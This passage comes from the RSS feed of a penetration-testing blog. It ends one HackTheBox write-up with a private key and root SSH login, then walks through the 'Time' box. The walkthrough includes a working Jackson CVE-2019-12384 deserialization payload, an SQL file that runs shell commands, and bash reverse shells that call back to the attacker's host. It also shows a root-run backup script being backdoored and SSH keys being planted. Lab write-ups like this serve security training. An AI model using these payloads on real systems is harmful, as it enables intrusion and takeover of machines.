KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
</code></pre></div><h4 id="ssh-access---root-host">SSH Access - root (host)</h4>
<p>After changing the key permissions to 600, I can login as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «ssh-key» «10.10.14.20» 
$ chmod 600 root_rsa 
→ root@kali «ssh-key» «10.10.14.20» 
$ ssh -i root_rsa root@10.10.10.220
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

...&lt;SNIP&gt;..
  System load:                      0.05
  Usage of /:                       67.1% of 17.59GB
  Memory usage:                     84%
  Swap usage:                       4%
  Processes:                        434
  Users logged in:                  0
  IPv4 address for br-bcb73b090b3f: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.220
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:211

...&lt;SNIP&gt;..
Last login: Thu Feb 11 14:28:18 2021
root@ready:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ready:~# ls -l
total 16
drwxr-xr-x  3 root root 4096 Dec  1 12:41 docker-gitlab
drwxr-xr-x 10 root root 4096 Jul  9  2020 ready-channel
-r--------  1 root root   33 Jul  8  2020 root.txt
drwxr-xr-x  3 root root 4096 May 18  2020 snap
</code></pre></div><p>I can also grab the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">root@ready:~# cut -c-15 root.txt 
b7f98681505cd39
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/</a></li>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Time</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-time/</link>
      <pubDate>Sun, 09 May 2021 05:43:58 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-time/</guid>
      <description>Deserialization attack on Jackson library</description>
      <content:encoded><![CDATA[<p>Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I&rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds. The script is world-writable, allowing me to inject a malicious code and obtain a root shell.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Deserialization Attack</li>
<li>Mitigation CVE-2019-12384</li>
<li>Exploiting Systemd timers</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-08 07:29 EDT
Nmap scan report <span class="k">for</span> 10.10.10.214
Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Online JSON parser
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 27.18 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 shows a website called &ldquo;Online JSON Beautifier &amp; Validator&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210508184016068.png" alt="image-20210508184016068"  />
</p>
<p>Clicking on the drop down menu, it provides two options: &ldquo;Beautify&rdquo; and &ldquo;Validate (beta!)&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210508184059429.png" alt="image-20210508184059429"  />
</p>
<h4 id="testing-inputs">Testing Inputs</h4>
<p>I submitted <code>{&quot;test&quot;: &quot;iamf&quot;}</code> to the input box and clicked the &ldquo;Process&rdquo; button. As expected, the beautify option just a JSON beautifier like <a href="https://stedolan.github.io/jq/">jq</a>.</p>
<p><img class="img-container" src="imgs/image-20210508184420130.png" alt="image-20210508184420130"  />
</p>
<p>I submitted the same input on &ldquo;Validate (beta!)&rdquo;, but this time it returns the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
</code></pre></div><p><img class="img-container" src="imgs/image-20210508184904577.png" alt="image-20210508184904577"  />
</p>
<p>I found this <a href="https://www.baeldung.com/jackson-inheritance#1-global-default-typing">site</a> while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span> 
<span class="s2">&#34;org.baeldung.jackson.inheritance.Truck&#34;</span><span class="p">,</span>
<span class="p">{</span> <span class="nt">&#34;make&#34;</span><span class="p">:</span> <span class="s2">&#34;Isuzu&#34;</span><span class="p">,</span> <span class="nt">&#34;model&#34;</span><span class="p">:</span> <span class="s2">&#34;NQR&#34;</span><span class="p">,</span><span class="nt">&#34;payloadCapacity&#34;</span><span class="p">:</span> <span class="mf">7500.0</span> <span class="p">}</span>
<span class="p">]</span>
</code></pre></div><p>And now it returns a different error message.</p>
<p><img class="img-container" src="imgs/image-20210508195850042.png" alt="image-20210508195850042"  />
</p>
<p>And that&rsquo;s because it probably can&rsquo;t find <code>org.baeldung.jackson.inheritance.Truck</code> since I made it up.</p>
<h4 id="finding-vulnerability">Finding Vulnerability</h4>
<p>I might be able to inject the &ldquo;<code>org.baeldung.jackson.inheritance.Truck</code>&rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:</p>
<ul>
<li><a href="https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/">Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill</a></li>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson gadgets - Anatomy of a vulnerability · Doyensec&rsquo;s Blog</a></li>
</ul>
<p>However, the post on Doyensec&rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses <code>ch.qos.logback.core.db.DriverManagerConnectionSource</code> as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.</p>
<p>Below is the example payload used.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span><span class="s2">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://localhost:8000/inject.sql&#39;&#34;</span><span class="p">}]</span>
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-pericles">Shell as pericles</h3>
<h4 id="exploiting-jackson-cve-2019-12384">Exploiting Jackson CVE-2019-12384</h4>
<p>I&rsquo;ll use the research from Doyensec&rsquo;s blog above as my reference.</p>
<p>First, I&rsquo;ll create a copy of the <code>inject.sql</code> file that is used by the researcher.</p>
<p><code>inject.sql</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">CREATE</span> <span class="n">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="n">AS</span> <span class="n">$$</span> <span class="n">String</span> <span class="nf">shellexec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
	<span class="n">String</span><span class="o">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
	<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
	<span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>  <span class="o">}</span>
<span class="n">$$</span><span class="o">;</span>
<span class="n">CALL</span> <span class="nf">SHELLEXEC</span><span class="o">(</span><span class="err">&#39;</span><span class="n">id</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">10</span><span class="o">.</span><span class="na">10</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">19</span><span class="o">/</span><span class="n">9000</span><span class="err">&#39;</span><span class="o">)</span>
</code></pre></div><p>Then, I&rsquo;ll setup a Python web server to host the SQL file and an <code>nc</code> listener to catch the request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ python3 -m http.server <span class="m">80</span>
Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div><p>Now I&rsquo;ll use the following JSON payload and submit it to the validator.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="p">[</span><span class="s2">&#34;ch.qos.logback.core.db.DriverManagerConnectionSource&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#39;http://10.10.14.19/inject.sql&#39;&#34;</span><span class="p">}]</span>
</code></pre></div><p>Within a few seconds, my Python web server receives a request for <code>inject.sql</code>, and my listener captures the output of the <code>id</code> command.</p>
<p><img class="img-container" src="imgs/image-20210508204955144.png" alt="image-20210508204955144"  />
</p>
<p>Knowing this, I can weaponize the <code>inject.sql</code> file to send myself a shell, and then perform the same procedure as above.</p>
<h4 id="weaponization---reverse-shell">Weaponization - Reverse Shell</h4>
<p>Now with the following <code>inject.sql</code>,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">CREATE</span> <span class="n">ALIAS</span> <span class="n">SHELLEXEC</span> <span class="n">AS</span> <span class="n">$$</span> <span class="n">String</span> <span class="nf">shellexec</span><span class="o">(</span><span class="n">String</span> <span class="n">cmd</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
	<span class="n">String</span><span class="o">[]</span> <span class="n">command</span> <span class="o">=</span> <span class="o">{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
	<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
	<span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>  <span class="o">}</span>
<span class="n">$$</span><span class="o">;</span>
<span class="n">CALL</span> <span class="nf">SHELLEXEC</span><span class="o">(</span><span class="err">&#39;</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">10</span><span class="o">.</span><span class="na">10</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">19</span><span class="o">/</span><span class="n">9000</span> <span class="n">0</span><span class="o">&gt;&amp;</span><span class="n">1</span><span class="err">&#39;</span><span class="o">)</span>
</code></pre></div><p>I can obtain an interactive shell.</p>
<pre><code>→ root@kali «time» «10.10.14.19» 
$ nc -nvlp 9000            
listening on [any] 9000 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 42496
bash: cannot set terminal process group (944): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ 
</code></pre><p><img class="img-container" src="imgs/image-20210508205643332.png" alt="image-20210508205643332"  />
</p>
<h4 id="upgrade-to-ssh">Upgrade to SSH</h4>
<p>With current access, I can put my public key to the <code>authorized_keys</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ mkdir .ssh
pericles@time:/home/pericles$
pericles@time:/home/pericles$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; .ssh/authorized_keys
</code></pre></div><p>Now I can login as <code>pericles</code> with my SSH private key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «time» «10.10.14.19» 
$ ssh pericles@10.10.10.214 
Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-52-generic x86_64<span class="o">)</span>

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               <span class="m">235</span>
  Users logged in:         <span class="m">0</span>
  IPv4 address <span class="k">for</span> ens160: 10.10.10.214
  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:a553

...&lt;SNIP&gt;...
Last login: Fri Oct <span class="m">23</span> 09:19:19 <span class="m">2020</span> from 10.10.14.5
pericles@time:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p><code>pericles</code> is the only user on this box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pericles@time:/home/pericles$ cat /etc/passwd <span class="p">|</span> grep sh$
cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
</code></pre></div><p>While searching files owned by <code>pericles</code>, I spotted a script called <code>timer_backup.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -user pericles 2&gt;/dev/null <span class="p">|</span>grep -v <span class="s1">&#39;proc\|sys&#39;</span>
/usr/bin/timer_backup.sh
/dev/shm/payloadds9LXy
/home/pericles/.gnupg/trustdb.gpg
/home/pericles/.gnupg/pubring.kbx
/home/pericles/.bashrc
...&lt;SNIP&gt;...
</code></pre></div><p>The script is backing up the website contents in <code>/var/www/html</code> to the root home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pericles@time:~$ cat /usr/bin/timer_backup.sh
<span class="c1">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
</code></pre></div><p>Interestingly, that script is writable by others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pericles@time:~$ ls -l /usr/bin/timer_backup.sh 
-rwxrw-rw- <span class="m">1</span> pericles pericles <span class="m">88</span> Apr <span class="m">10</span> 21:05 /usr/bin/timer_backup.sh
</code></pre></div><p>I searched other file related to the script, and found out there is a timer owned by root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pericles@time:~$ find / -type f -name <span class="s2">&#34;timer_backup*&#34;</span> -ls 2&gt;/dev/null
   <span class="m">795750</span>      <span class="m">4</span> -rw-r--r--   <span class="m">1</span> root     root          <span class="m">214</span> Oct <span class="m">23</span> 06:46 /etc/systemd/system/timer_backup.timer
   <span class="m">787186</span>      <span class="m">4</span> -rw-r--r--   <span class="m">1</span> root     root          <span class="m">159</span> Oct <span class="m">23</span> 05:59 /etc/systemd/system/timer_backup.service
  <span class="m">1317302</span>      <span class="m">4</span> -rwxrw-rw-   <span class="m">1</span> pericles pericles       <span class="m">88</span> Apr <span class="m">10</span> 21:10 /usr/bin/timer_backup.sh
</code></pre></div><p><code>timer_backup.timer</code> requires <code>timer_backup.service</code>,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.timer 
[Unit]
Description=Backup of the website
Requires=timer_backup.service

[Timer]
Unit=timer_backup.service
#OnBootSec=10s
#OnUnitActiveSec=10s
OnUnitInactiveSec=10s
AccuracySec=1ms

[Install]
WantedBy=timers.target
</code></pre></div><p>and what <code>timer_backup.service</code> doing is it restarts <code>web_backup.service</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/timer_backup.service 
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
</code></pre></div><p><code>web_backup.service</code> executes the <code>timer_backup.sh</code> script which is owned by <code>pericles</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">pericles@time:~$ cat /etc/systemd/system/web_backup.service
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
</code></pre></div><h4 id="exploiting-timer_backupsh">Exploiting timer_backup.sh</h4>
<p>With writable access, I can put a <code>bash</code> reverse shell in <code>timer_backup.sh</code>, and then setup a <code>nc</code> listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">pericles@time:~$ <span class="nb">echo</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.19/9002 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/bin/timer_backup.sh 
pericles@time:~$ 
pericles@time:~$ cat /usr/bin/timer_backup.sh 
<span class="c1">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.72/9002 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</code></pre></div><p>Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ rlwrap nc -nvlp <span class="m">9002</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
connect to <span class="o">[</span>10.10.14.72<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">57648</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>411032<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
root@time:/# 
root@time:/# <span class="nb">exit</span>
</code></pre></div><p>So I repeated the steps, but this time, I immediately injected my public key to the root&rsquo;s <code>authorized_keys</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ nc -nvlp <span class="m">9002</span>                          
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
connect to <span class="o">[</span>10.10.14.19<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">34182</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>65312<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
root@time:/#  <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; /root/.ssh/authorized_keys
&lt;rj6mXxSIGq3E5ks1g+moK<span class="err">&#39;</span> &gt; /root/.ssh/authorized_keys
root@time:/# <span class="nb">exit</span>
</code></pre></div><p>After that, I can login as root via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@kali «time» «10.10.14.19» 
$ ssh root@10.10.10.214
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               235
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.214
  IPv6 address for ens160: dead:beef::250:56ff:feb9:a553


...&lt;SNIP&gt;...
Last login: Tue Feb  9 14:41:33 2021
root@time:~# id
uid=0(root) gid=0(root) groups=0(root)
root@time:~# cut -c-16 root.txt 
27375f967f43232f
</code></pre></div><h2 id="extras">Extras</h2>
<p>In this extras, I&rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I&rsquo;ll try to patch it.</p>
<h3 id="cve-2019-12384">CVE-2019-12384</h3>
<h4 id="causes">Causes</h4>
<p>According to <a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">this site</a>, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.</p>
<p><img class="img-container" src="imgs/image-20210509215030250.png" alt="image-20210509215030250"  />
</p>
<p>The first condition is fulfilled by the <code>index.php</code> file (<code>/var/www/html/index.php</code>). I have control on the user input.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;2&#34;</span><span class="p">){</span>
                <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="s2">&#34;/dev/shm&#34;</span><span class="p">,</span> <span class="s2">&#34;payload&#34;</span><span class="p">);</span>
                <span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Unable to open file!&#34;</span><span class="p">);</span>
                <span class="nv">$txt</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span> <span class="c1">// Condition #1,  $txt controlled by user. no filter
</span><span class="c1"></span>                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span> <span class="nv">$txt</span><span class="p">);</span> 
                <span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
                <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/usr/bin/jruby /opt/json_project/parse.rb </span><span class="si">$filename</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">,</span> <span class="nv">$cmdout</span><span class="p">,</span> <span class="nv">$ret</span><span class="p">);</span>
                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
                        <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;Validation successful!&lt;/pre&gt;&#39;</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">else</span><span class="p">{</span>
                        <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;Validation failed: &#39;</span> <span class="o">.</span> <span class="nv">$cmdout</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
                <span class="nv">$json_ugly</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span>
                <span class="nv">$json_pretty</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json_ugly</span><span class="p">),</span> <span class="nx">JSON_PRETTY_PRINT</span><span class="p">);</span>
                <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nv">$json_pretty</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>

<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span><span class="err">...&lt;SNIP&gt;...
</span></code></pre></div><p>The second condition fulfilled by the parser itself (<code>/opt/json_project/parse.rb</code>). It uses &ldquo;Default typing&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;java&#39;</span>

<span class="no">Dir</span><span class="o">[</span><span class="s2">&#34;/opt/json_project/classpath/*.jar&#34;</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
      <span class="nb">require</span> <span class="n">f</span>
<span class="k">end</span>

<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
